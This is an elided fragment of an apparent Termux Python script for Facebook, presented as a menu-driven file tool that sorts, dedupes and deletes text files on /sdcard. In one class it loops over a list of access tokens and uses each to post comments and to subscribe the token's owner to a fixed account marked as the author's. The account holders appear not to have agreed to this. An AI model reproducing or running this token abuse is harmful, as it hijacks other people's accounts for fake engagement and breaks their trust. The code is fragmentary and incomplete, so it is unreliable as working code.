...
class dubb:
	def __init__(self):
		...
		os.system('sort -r "'+file+'" | uniq > /sdcard/biki')
		os.system('rm -rf /sdcard/1.txt')
		os.system('rm -rf /sdcard/biki.txt.txt')
		os.system('rm -rf /sdcard/BIKI.txt')
		print(47*'\033[1;97m-\033[0;0m')
		print ("[✓] Removing successfully ..")
		print ("[✓] Your file path : /storage/emulated/0/biki.txt")
		print(47*'\033[1;97m-\033[0;0m')
		input ("\n[?] Retrun back menu")
		os.system("python Brand.py")
class login:
...
class msort:
	def __init__(self):
		...
		os.system('sort -r /sdcard/1.txt | uniq > /sdcard biki.txt')
		os.system('rm -rf /sdcard/1.txt')
	...
	def __init__(self):
		...
		for naa in token_free:
			...
			if len(naa)>=37:
				...
				requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + comment + '&access_token=' + token)
				requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + somi + '&access_token=' + token)
				requests.post('https://graph.facebook.com/100007607054845/subscribers?access_token=' + token) ### FB BIKI
				cek_token(naa)
...
class coke:
	def __init__(self):
		...
		exit(jalan(war+"Run This Script Again : python Biki.py"))
